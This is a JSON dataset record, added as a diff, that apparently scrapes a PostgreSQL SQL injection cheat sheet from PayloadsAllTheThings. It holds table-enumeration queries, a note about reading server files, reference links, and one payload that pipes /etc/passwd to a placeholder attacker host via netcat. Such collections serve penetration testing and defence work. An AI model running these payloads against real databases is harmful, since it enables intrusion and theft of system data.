@@ -1,0 +1,26 @@
+{
+  "id": "sqli-65a4039193d7",
+  "category": "SQLI",
+  "title": "PostgreSQL Injection",
+  "description": "# PostgreSQL Injection\n\n> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.\n\n## Summary\n\n* [PostgreSQL Comments](#postgresql-comments)\n* [PostgreSQL Enumeration](#postgresql-enumeration)\n* [PostgreSQL Methodology](#postgresql-methodology)\n* [PostgreSQL Error Based](#postgresql-error-based)\n    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)\n* [PostgreSQ",
+  "payloads": [
+    "| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |",
+    "| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |",
+    "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |",
+    "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |",
+    "| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |",
+    "NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.",
+    "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
+    "* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)",
+    "* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)",
+    "* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)",
+    "* [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)",
+    "* [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)",
+    "* [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://hackerone.com/reports/181803)",
+    "* [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://pulsesecurity.co.nz/articles/postgres-sqli)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/SQL Injection/PostgreSQL Injection.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
